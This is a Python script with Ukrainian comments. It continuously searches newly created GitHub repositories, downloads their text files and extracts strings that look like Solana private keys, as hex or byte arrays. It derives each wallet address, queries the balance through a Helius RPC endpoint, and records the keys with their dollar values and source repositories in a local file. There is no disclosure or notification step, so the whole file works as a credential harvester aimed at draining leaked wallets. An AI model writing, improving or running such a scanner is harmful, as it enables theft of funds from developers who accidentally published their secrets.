# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import re
import json
import logging
from urllib.parse import quote
from dotenv import load_dotenv
import os
from datetime import datetime, timedelta, timezone
from solders.keypair import Keypair

# Базовий шлях проекту (Windows)
BASE_DIR = r"C:\Users\user\Desktop\github scanner"
LOG_DIR = os.path.normpath(os.path.join(BASE_DIR, "logs"))
OUTPUT_DIR = os.path.normpath(os.path.join(BASE_DIR, "keys"))

# Налаштування логування
repo_logger = logging.getLogger('repo')
repo_logger.setLevel(logging.INFO)
repo_handler = logging.FileHandler(os.path.join(LOG_DIR, 'scanner_repos.log'), encoding='utf-8')
repo_handler.setFormatter(logging.Formatter('%(message)s'))
repo_handler.flush = lambda: repo_handler.stream.flush()  # Примусовий flush
repo_logger.addHandler(repo_handler)

info_error_logger = logging.getLogger('info_error')
info_error_logger.setLevel(logging.INFO)
info_error_handler = logging.FileHandler(os.path.join(LOG_DIR, 'scanner_info_errors.log'), encoding='utf-8')
info_error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
info_error_handler.flush = lambda: info_error_handler.stream.flush()  # Примусовий flush
info_error_logger.addHandler(info_error_handler)

# Завантаження змінних із .env
load_dotenv(os.path.join(BASE_DIR, ".env"))

# Конфігурація
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
HELIUS_API_KEY = os.getenv("HELIUS_API_KEY")

if not GITHUB_TOKEN:
    raise ValueError("GITHUB_TOKEN not found in .env file")
if not HELIUS_API_KEY:
    info_error_logger.warning("HELIUS_API_KEY not found. Solana balance checking disabled.")
    print("Warning: HELIUS_API_KEY not found. Solana balance checking disabled.")
    SOLANA_AVAILABLE = False
else:
    SOLANA_AVAILABLE = True

# Створення директорій для вихідних файлів і логів
try:
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    if not os.path.isdir(OUTPUT_DIR):
        raise OSError(f"Output directory {OUTPUT_DIR} does not exist and could not be created")
    if not os.path.isdir(LOG_DIR):
        raise OSError(f"Log directory {LOG_DIR} does not exist and could not be created")
    info_error_logger.info(f"Created/verified directories: {LOG_DIR}, {OUTPUT_DIR}")
    print(f"Created/verified directories: {LOG_DIR}, {OUTPUT_DIR}")
except Exception as e:
    info_error_logger.error(f"Failed to create directories: {e}")
    print(f"Error: Failed to create directories: {e}")
    raise

OUTPUT_FILES = {
    "solana": os.path.join(OUTPUT_DIR, "solana_keys.txt")
}

# Тест запису в solana_keys.txt
try:
    with open(OUTPUT_FILES["solana"], "a", encoding="utf-8") as f:
        f.write("")  # Порожній запис для перевірки
    info_error_logger.info(f"Successfully verified write access to {OUTPUT_FILES['solana']}")
    print(f"Successfully verified write access to {OUTPUT_FILES['solana']}")
except Exception as e:
    info_error_logger.error(f"Cannot write to {OUTPUT_FILES['solana']}: {e}")
    print(f"Error: Cannot write to {OUTPUT_FILES['solana']}: {e}")
    raise

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
BASE_URL = "https://api.github.com"
SOLANA_RPC = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"
REPO_SCAN_TIMEOUT = 10
CRYPTO_REQUEST_TIMEOUT = 5
RECENT_MINUTES = 1  # Початкова 1-хвилинна вікно
SUB_INTERVAL_SECONDS = 5  # 5-секундні піддіапазони
MAX_CONCURRENT_SCANS = 5  # Максимум 5 паралельних сканувань
PAGE_DELAY_SECONDS = 5  # Затримка між сторінками
TARGET_QUEUE_SIZE = 100  # Цільовий розмір черги

# Дозволені розширення файлів (текстові формати)
ALLOWED_EXTENSIONS = {
    '.txt', '.py', '.js', '.json', '.md', '.yml', '.yaml', '.ts', '.jsx', '.tsx', '.html', '.css',
    '.java', '.cpp', '.c', '.h', '.cs', '.go', '.rb', '.php', '.sh', '.bat', '.xml', '.ini', '.conf'
}

# Дозволені Content-Type (текстові MIME-типи)
TEXT_CONTENT_TYPES = {
    'text/plain', 'application/json', 'text/x-python', 'application/javascript', 'text/javascript',
    'text/x-yaml', 'text/html', 'text/css', 'text/x-markdown', 'text/x-sh', 'application/xml',
    'text/xml'
}

CRYPTO_PRICES = {
    "solana": 150.0
}

FOUND_KEYS = set()
PROCESSED_REPOS = set()
SEEN_REPO_IDS = set()
REPO_COUNT = 0
FOUND_KEYS_LOCK = asyncio.Lock()  # Лок для синхронізації FOUND_KEYS

# Завантаження оброблених репозиторіїв із scanner_repos.log
def load_processed_repos():
    repo_log_path = os.path.join(LOG_DIR, "scanner_repos.log")
    if not os.path.exists(repo_log_path):
        info_error_logger.info("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
        print("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
        return
    try:
        cutoff_time = datetime.now(timezone.utc) - timedelta(days=7)  # Обмеження на 7 днів
        with open(repo_log_path, "r", encoding="utf-8") as f:
            for line in f:
                # Формат: "X - YYYY-MM-DD HH:MM:SS - Scanning repo_name (created: ...)"
                parts = line.strip().split(" - ")
                if len(parts) >= 3 and parts[2].startswith("Scanning "):
                    repo_name = parts[2].split(" (")[0].replace("Scanning ", "")
                    try:
                        log_time = datetime.strptime(parts[1], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
                        if log_time >= cutoff_time:
                            PROCESSED_REPOS.add(repo_name)
                    except ValueError:
                        continue
        info_error_logger.info(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log (within last 7 days)")
        print(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log (within last 7 days)")
    except Exception as e:
        info_error_logger.error(f"Error loading scanner_repos.log: {e}")
        print(f"Error loading scanner_repos.log: {e}")

# Виклик функції завантаження при запуску
load_processed_repos()

def is_hex_key(data):
    hex_pattern = r"^[0-9a-fA-F]{64}$"
    if not bool(re.match(hex_pattern, data)):
        return False
    if data == "0000000000000000000000000000000000000000000000000000000000000000":
        info_error_logger.info(f"Skipping known test key: {data}")
        print(f"Skipping known test key: {data[:8]}...")
        return False
    return True

def is_byte_array_key(data):
    byte_array_pattern = r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]"
    if not bool(re.match(byte_array_pattern, data)):
        return False
    try:
        cleaned = data.strip("[]").replace(" ", "")
        bytes_list = [int(x) for x in cleaned.split(",") if x]
        if len(bytes_list) != 32:
            return False
        hex_key = "".join([format(b, "02x") for b in bytes_list])
        if is_hex_key(hex_key):
            return hex_key
        return False
    except:
        return False

def private_key_to_sol_address(private_key):
    if not SOLANA_AVAILABLE:
        return None
    try:
        private_key_bytes = bytes.fromhex(private_key)
        keypair = Keypair.from_seed(private_key_bytes[:32])
        return str(keypair.pubkey())
    except Exception as e:
        info_error_logger.error(f"Error converting private key to SOL address: {e}")
        print(f"Error converting private key to SOL address: {e}")
        return None

async def get_balance(session, private_key):
    balances = {}
    if not SOLANA_AVAILABLE:
        return balances
    print(f"Checking Solana balance for key: {private_key[:8]}...")
    sol_address = private_key_to_sol_address(private_key)
    if sol_address:
        try:
            async with session.post(
                SOLANA_RPC,
                json={
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [sol_address]
                },
                timeout=CRYPTO_REQUEST_TIMEOUT
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    balance_lamports = data.get("result", {}).get("value", 0)
                    balance_sol = balance_lamports / 1_000_000_000
                    usd_value = balance_sol * CRYPTO_PRICES["solana"]
                    balances["SOL"] = balance_sol
                    print(f"Solana balance: {balance_sol:.8f} SOL (${usd_value:.2f})")
                else:
                    info_error_logger.warning(f"Failed to check SOL balance for {sol_address}: HTTP {response.status}, Response: {await response.text()}")
                    print(f"Failed to check SOL balance: HTTP {response.status}")
        except asyncio.TimeoutError:
            info_error_logger.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
            print(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
        except Exception as e:
            info_error_logger.error(f"Error checking SOL balance for {sol_address}: {e}")
            print(f"Error checking SOL balance: {e}")
    return balances

async def scan_file_content(session, file_url, repo_name):
    try:
        async with session.get(file_url, headers=HEADERS) as response:
            if response.status != 200:
                info_error_logger.warning(f"Failed to fetch file {file_url}: HTTP {response.status}")
                print(f"Warning: Failed to fetch file {file_url}: HTTP {response.status}")
                return []

            # Перевіряємо Content-Type
            content_type = response.headers.get('Content-Type', '').split(';')[0].lower()
            if content_type not in TEXT_CONTENT_TYPES:
                info_error_logger.info(f"Skipping non-text file {file_url}: Content-Type {content_type}")
                print(f"Skipping non-text file {file_url}: Content-Type {content_type}")
                return []

            # Спробуємо отримати вміст як текст
            content = await response.text()
    except UnicodeDecodeError as e:
        info_error_logger.error(f"Failed to decode file {file_url}: {e}")
        print(f"Error: Failed to decode file {file_url}: {e}")
        return []
    except Exception as e:
        info_error_logger.error(f"Error fetching file {file_url}: {e}")
        print(f"Error fetching file {file_url}: {e}")
        return []

    found_keys = []

    # Hex ключі (Solana)
    hex_candidates = re.findall(r"(?:private_key\s*=\s*|key\s*=\s*|#|//|\s)([0-9a-fA-F]{64})(?:\s|$)", content, re.IGNORECASE)
    for candidate in hex_candidates:
        info_error_logger.info(f"Test: Hex candidate: {candidate}")
        if is_hex_key(candidate):
            async with FOUND_KEYS_LOCK:
                if candidate in FOUND_KEYS:
                    info_error_logger.info(f"Skipping duplicate Hex key in {repo_name}: {candidate}")
                    print(f"Skipping duplicate Hex key in {repo_name}: {candidate[:8]}...")
                    continue
                FOUND_KEYS.add(candidate)
            print(f"Found Hex key in {repo_name}: {candidate[:8]}...")
            balances = await get_balance(session, candidate)
            found_keys.append({
                "key": candidate,
                "repo": repo_name,
                "balances": balances,
                "type": "hex"
            })
            info_error_logger.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")

    # Byte array ключі (Solana)
    byte_array_candidates = re.findall(r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]", content)
    for candidate in byte_array_candidates:
        info_error_logger.info(f"Test: Byte array candidate: {candidate}")
        hex_key = is_byte_array_key(candidate)
        if hex_key:
            async with FOUND_KEYS_LOCK:
                if hex_key in FOUND_KEYS:
                    info_error_logger.info(f"Skipping duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key})")
                    print(f"Skipping duplicate byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
                    continue
                FOUND_KEYS.add(hex_key)
            print(f"Found byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
            balances = await get_balance(session, hex_key)
            found_keys.append({
                "key": hex_key,
                "repo": repo_name,
                "balances": balances,
                "type": "byte_array"
            })
            info_error_logger.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")

    return found_keys

async def scan_repository(session, repo):
    global REPO_COUNT
    repo_name = repo["full_name"]
    async with FOUND_KEYS_LOCK:
        if repo_name in PROCESSED_REPOS:
            info_error_logger.info(f"Skipping already processed repository: {repo_name}")
            print(f"Skipping already processed repository: {repo_name}")
            return []
        PROCESSED_REPOS.add(repo_name)

    REPO_COUNT += 1
    created_at = repo.get("created_at", "N/A")
    repo_logger.info(f"{REPO_COUNT} - {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} - Scanning {repo_name} (created: {created_at})")
    print(f"Scanning {repo_name} (created: {created_at})")

    contents_url = f"{BASE_URL}/repos/{repo_name}/contents"
    try:
        async with session.get(contents_url, headers=HEADERS, timeout=REPO_SCAN_TIMEOUT) as response:
            if response.status != 200:
                info_error_logger.warning(f"Failed to fetch contents for {repo_name}: HTTP {response.status}")
                print(f"Warning: Failed to fetch contents for {repo_name}: HTTP {response.status}")
                return []
            contents = await response.json()
    except asyncio.TimeoutError:
        info_error_logger.warning(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
        print(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
        return []
    except Exception as e:
        info_error_logger.error(f"Error fetching contents for {repo_name}: {e}")
        print(f"Error fetching contents for {repo_name}: {e}")
        return []

    found_keys = []
    tasks = []
    for item in contents:
        if item["type"] == "file" and not item["name"].lower() == "readme.md":
            file_name = item["name"]
            file_ext = os.path.splitext(file_name)[1].lower()
            if file_ext not in ALLOWED_EXTENSIONS:
                info_error_logger.info(f"Skipping file {file_name} in {repo_name}: unsupported extension {file_ext}")
                print(f"Skipping file {file_name} in {repo_name}: unsupported extension {file_ext}")
                continue
            file_url = item["download_url"]
            if file_url:
                tasks.append(scan_file_content(session, file_url, repo_name))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, list):
            found_keys.extend(result)

    return found_keys

async def save_keys(keys):
    if not keys:
        return
    saved_count = 0
    for key_info in keys:
        key = key_info["key"]
        repo = key_info["repo"]
        balances = key_info["balances"]
        key_type = key_info["type"]

        async with FOUND_KEYS_LOCK:
            if key not in FOUND_KEYS:
                info_error_logger.warning(f"Attempted to save non-registered key {key[:8]}... from {repo}")
                print(f"Warning: Attempted to save non-registered key {key[:8]}... from {repo}")
                continue

        # Solana (hex, byte_array)
        balance = balances.get("SOL", 0)
        balance_str = f"SOL: {balance:.8f} (${balance * CRYPTO_PRICES['solana']:.2f} USD)" if "SOL" in balances else "SOL: N/A"
        try:
            with open(OUTPUT_FILES["solana"], "a", encoding="utf-8") as f:
                f.write(f"{key} | {balance_str} | Type: {key_type} | Repo: {repo}\n")
                f.flush()  # Примусовий flush
            info_error_logger.info(f"Saved SOL key to {OUTPUT_FILES['solana']}: {key[:8]}... with balance {balance_str}")
            print(f"Saved SOL key to {OUTPUT_FILES['solana']}: {key[:8]}... with balance {balance_str}")
            saved_count += 1
        except Exception as e:
            info_error_logger.error(f"Failed to save SOL key to {OUTPUT_FILES['solana']}: {e}")
            print(f"Error: Failed to save SOL key to {OUTPUT_FILES['solana']}: {e}")
            continue

    if saved_count > 0:
        print(f"Saved {saved_count} keys to {OUTPUT_FILES['solana']}")
    else:
        print("No new keys saved")

async def fetch_repos_to_queue(session, repo_queue, start_time, end_time):
    start_time_str = start_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    end_time_str = end_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    search_query = f"created:{start_time_str}..{end_time_str}"
    encoded_query = quote(search_query)
    info_error_logger.info(f"Query: {search_query}")
    print(f"Query: {search_query}")
    if len(encoded_query) > 256:
        info_error_logger.error(f"Query too long: {len(encoded_query)} characters")
        print(f"Error: Query too long: {len(encoded_query)} characters")
        return
    search_url = f"{BASE_URL}/search/repositories?q={encoded_query}&sort=created&order=desc"
    print(f"Fetching repositories with query: {search_query}...")
    info_error_logger.info(f"Fetching repositories with query: {search_query}...")
    page = 1
    while repo_queue.qsize() < TARGET_QUEUE_SIZE:
        try:
            async with session.get(f"{search_url}&page={page}&per_page=100", headers=HEADERS) as response:
                if response.status == 403 and "rate limit exceeded" in (await response.text()).lower():
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    if reset_time:
                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
                        info_error_logger.warning(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset")
                        print(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset...")
                        await asyncio.sleep(wait_seconds)
                    else:
                        info_error_logger.warning("API rate limit exceeded, pausing for 60 seconds")
                        print("API rate limit exceeded, pausing for 60 seconds...")
                        await asyncio.sleep(60)
                    continue
                if response.status != 200:
                    error_text = await response.text()
                    info_error_logger.error(f"Error fetching repositories: HTTP {response.status}, Response: {error_text}")
                    print(f"Error fetching repositories: HTTP {response.status}, Response: {error_text}")
                    break
                remaining = response.headers.get("X-RateLimit-Remaining", "unknown")
                info_error_logger.info(f"API requests remaining: {remaining}")
                print(f"API requests remaining: {remaining}")
                if remaining != "unknown" and int(remaining) < 10:
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    if reset_time:
                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
                        info_error_logger.warning(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset")
                        print(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset...")
                        await asyncio.sleep(wait_seconds)
                    else:
                        info_error_logger.warning("Low API rate limit, pausing for 60 seconds")
                        print("Low API rate limit, pausing for 60 seconds...")
                        await asyncio.sleep(60)
                data = await response.json()
                total_count = data.get("total_count", 0)
                page_repos = data.get("items", [])
                info_error_logger.info(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
                print(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
                if total_count > 1000:
                    info_error_logger.warning(f"Search results exceed 1000 ({total_count}), processing current page")
                    print(f"Warning: Search results exceed 1000 ({total_count}), processing current page")
                    info_error_logger.info(f"API response: {json.dumps(data, indent=2)}")
                if not page_repos:
                    info_error_logger.info(f"No more repositories on page {page}, stopping pagination")
                    print(f"No more repositories on page {page}, stopping pagination")
                    break

                filtered_repos = []
                async with FOUND_KEYS_LOCK:
                    for repo in page_repos:
                        repo_id = repo["id"]
                        repo_name = repo["full_name"]
                        if repo_id not in SEEN_REPO_IDS and repo_name not in PROCESSED_REPOS:
                            SEEN_REPO_IDS.add(repo_id)
                            filtered_repos.append(repo)
                            await repo_queue.put(repo)
                            created_at = repo.get("created_at", "N/A")
                            info_error_logger.info(f"Queued repo: {repo_name}, created_at: {created_at}")
                            print(f"Queued repo: {repo_name}, created_at: {created_at}")
                        else:
                            info_error_logger.info(f"Skipped repo: {repo_name} (already in SEEN_REPO_IDS or PROCESSED_REPOS)")
                            print(f"Skipped repo: {repo_name} (already in SEEN_REPO_IDS or PROCESSED_REPOS)")

                info_error_logger.info(f"Queued {len(filtered_repos)} repositories from page {page}, total queued: {repo_queue.qsize()}")
                print(f"Queued {len(filtered_repos)} repositories from page {page}, total queued: {repo_queue.qsize()}")

        except Exception as e:
            info_error_logger.error(f"Error fetching repositories on page {page}: {e}")
            print(f"Error fetching repositories on page {page}: {e}")
            break
        page += 1
        if page_repos:
            await asyncio.sleep(PAGE_DELAY_SECONDS)

async def process_queue(session, repo_queue):
    tasks = []
    while not repo_queue.empty():
        repo = await repo_queue.get()
        tasks.append(asyncio.create_task(scan_repository(session, repo)))
        if len(tasks) >= MAX_CONCURRENT_SCANS:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, list) and result:
                    await save_keys(result)
            tasks = []
        repo_queue.task_done()
    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, list) and result:
                await save_keys(result)
        for task in tasks:
            repo_queue.task_done()

async def main():
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        last_end_time = None  # Відстежуємо кінець останнього вікна
        while True:
            try:
                cycle_count += 1
                info_error_logger.info(f"Starting cycle {cycle_count}")
                print(f"Starting cycle {cycle_count}")

                # Скидаємо SEEN_REPO_IDS і FOUND_KEYS для нового циклу
                global SEEN_REPO_IDS, FOUND_KEYS
                SEEN_REPO_IDS = set()
                FOUND_KEYS = set()
                info_error_logger.info("Reset SEEN_REPO_IDS and FOUND_KEYS for new cycle")
                print("Reset SEEN_REPO_IDS and FOUND_KEYS for new cycle")

                # Створюємо нову чергу
                repo_queue = asyncio.Queue()
                current_time = datetime.now(timezone.utc)

                # Якщо є last_end_time, використовуємо його як початок нового вікна
                if last_end_time and last_end_time > current_time - timedelta(minutes=RECENT_MINUTES):
                    start_time = last_end_time
                else:
                    start_time = current_time - timedelta(minutes=RECENT_MINUTES)

                minutes_extended = 0

                # Заповнення черги до 100 репозиторіїв
                while repo_queue.qsize() < TARGET_QUEUE_SIZE and minutes_extended < 10:  # Обмеження на 10 хвилин
                    sub_intervals = []
                    interval_start = start_time - timedelta(minutes=minutes_extended)
                    interval_end = current_time if minutes_extended == 0 else start_time - timedelta(minutes=minutes_extended - 1)
                    while interval_start < interval_end:
                        sub_interval_end = min(interval_start + timedelta(seconds=SUB_INTERVAL_SECONDS), interval_end)
                        sub_intervals.append((interval_start, sub_interval_end))
                        interval_start = sub_interval_end

                    info_error_logger.info(f"Creating queue with {len(sub_intervals)} sub-intervals, minutes_extended={minutes_extended}")
                    print(f"Creating queue with {len(sub_intervals)} sub-intervals, minutes_extended={minutes_extended}")

                    for start, end in sub_intervals:
                        await fetch_repos_to_queue(session, repo_queue, start, end)
                        if repo_queue.qsize() >= TARGET_QUEUE_SIZE:
                            last_end_time = end  # Зберігаємо кінець поточного вікна
                            break

                    minutes_extended += 1

                # Якщо черга порожня, чекаємо 5 секунд і пробуємо знову
                if repo_queue.qsize() == 0:
                    info_error_logger.info("No repositories found, waiting 5 seconds before retrying")
                    print("No repositories found, waiting 5 seconds before retrying")
                    await asyncio.sleep(5)
                    continue

                # Обробка черги до завершення
                info_error_logger.info(f"Processing queue with {repo_queue.qsize()} repositories")
                print(f"Processing queue with {repo_queue.qsize()} repositories")
                await process_queue(session, repo_queue)

                info_error_logger.info(f"Completed queue processing, processed {REPO_COUNT} repositories")
                print(f"Completed queue processing, processed {REPO_COUNT} repositories")

                # Негайно починаємо новий цикл без затримки, якщо не обмежені API
                info_error_logger.info("Starting next cycle immediately")
                print("Starting next cycle immediately")

            except Exception as e:
                info_error_logger.error(f"Critical error in main loop: {e}")
                print(f"Critical error in main loop: {e}")
                info_error_logger.info(f"Retrying in 60 seconds...")
                print(f"Retrying in 60 seconds...")
                await asyncio.sleep(60)

if __name__ == "__main__":
    asyncio.run(main())